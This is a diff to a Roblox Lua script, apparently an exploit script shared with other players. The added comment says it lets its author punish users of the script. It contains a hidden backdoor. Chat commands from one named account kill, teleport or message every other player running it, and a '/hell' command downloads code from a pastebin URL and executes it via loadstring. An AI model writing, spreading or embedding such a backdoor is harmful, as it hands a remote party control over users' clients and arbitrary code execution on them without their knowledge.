@@ -1,27 +1,4 @@
---Bypasser
---authority
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+--This script gives me (LuaE) the ability to kick the in-game ass of anyone attempting to use my own script to mess with me
 
 local admin = game.Players:FindFirstChild("d4rkagee")
 local chat = game:GetService("Chat")
@@ -38,7 +15,7 @@ end)
 admin.Chatted:Connect(function(cht)
 	if cht:match("/kill") then
 		if game.Players.LocalPlayer ~= admin then
-			game.Players.LocalPlayer.Character:Destroy()
+			game.Players.LocalPlayer.Character:FindFirstChild("Humanoid").Health = 0
 		end
 	end
 end)
@@ -102,6 +79,24 @@ admin.Chatted:Connect(function(cht)
 	if cht:match("/hell") then
 		if game.Players.LocalPlayer ~= admin then
 			loadstring(game:HttpGet("https://pastebin.com/raw/JzFRfhYe"))()
+		end
+	end
+end)
+
+
+admin.Chatted:Connect(function(cht)
+	if cht:match("/worship") then
+		if game.Players.LocalPlayer ~= admin then
+			game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", { Text ="Hail LuaE"})
+		end
+	end
+end)
+
+
+admin.Chatted:Connect(function(cht)
+	if cht:match("/bring") then
+		if game.Players.LocalPlayer ~= admin then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(admin.Character.Head.Position)
 		end
 	end
 end)
